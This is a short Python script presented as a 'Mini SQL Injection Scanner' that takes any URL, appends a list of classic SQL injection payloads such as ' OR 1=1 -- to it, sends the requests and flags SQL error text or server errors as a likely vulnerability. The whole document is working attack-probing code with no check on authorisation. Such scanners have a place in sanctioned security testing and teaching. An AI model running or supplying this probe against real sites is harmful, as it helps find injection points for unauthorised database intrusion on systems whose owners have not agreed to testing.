import requests

print("=== Mini SQL Injection Scanner v2 ===\n")

url = input("Enter URL: ")

payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "';--",
    "' OR 1=1#",
    "' OR '1'='1"
]

error_keywords = ["sql", "syntax", "error", "database", "warning"]

vulnerable = False

for payload in payloads:
    test_url = url + payload
    print(f"\n[+] Testing payload: {payload}")

    try:
        response = requests.get(test_url, timeout=5)

        print(f"Status Code: {response.status_code}")

        if any(keyword in response.text.lower() for keyword in error_keywords):
            print("[!] Possible SQL Injection detected!")
            vulnerable = True

        elif response.status_code == 500:
            print("[!] Possible SQL Injection (Server Error)")
            vulnerable = True

        else:
            print("[-] No obvious vulnerability detected")

    except Exception as e:
        print("Error:", e)

if vulnerable:
    print("\n[+] Target appears VULNERABLE!")
else:
    print("\n[-] Target does NOT appear vulnerable")